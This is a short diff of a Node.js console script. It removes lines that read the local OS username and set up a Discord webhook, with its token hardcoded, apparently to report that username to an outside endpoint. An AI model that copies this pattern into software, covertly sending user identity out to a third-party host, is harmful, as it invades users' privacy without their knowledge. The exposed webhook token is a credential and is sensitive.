@@ -25,30 +25,14 @@ const colors = require("colors");
 const ask = require("prompt-sync")();
 var readline = require('readline');
 const rancolor = require("randomcolor");
-const { Webhook, MessageBuilder } = require('discord-webhook-node');
 const request = require("request");
 const os = require("os");
 const fs = require('fs');
-const user = os.userInfo().username
-const webhook = new Webhook("https://discord.com/api/webhooks/991660248706338877/uciiHDKzv6L6CJJROsccu9xbo4Yo0BqsiCcZ_MVvcPDfpgApyFYk_BI-NJ9gBDSTJzCJ");
-const webhook1 = new Webhook("https://discord.com/api/webhooks/991660248706338877/uciiHDKzv6L6CJJROsccu9xbo4Yo0BqsiCcZ_MVvcPDfpgApyFYk_BI-NJ9gBDSTJzCJ");
-webhook.setUsername(`${user}`);
 var pk = fs.readFileSync('./key.pem');
 var pc = fs.readFileSync('./cert.pem');
 var optss = { key: pk, cert: pc };
 
-var ran = randomNum(9999,99999)
-var ranc = rancolor();
 
-function randomNum(min, max) {
-    min = Math.ceil(min);
-    max = Math.floor(max);
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-var code1;
-var val = Math.floor(100000 + Math.random() * 900000);
-code1 = val;
                                                                                    
 console.log (`
               ╔════════════════════════════════════════════╗
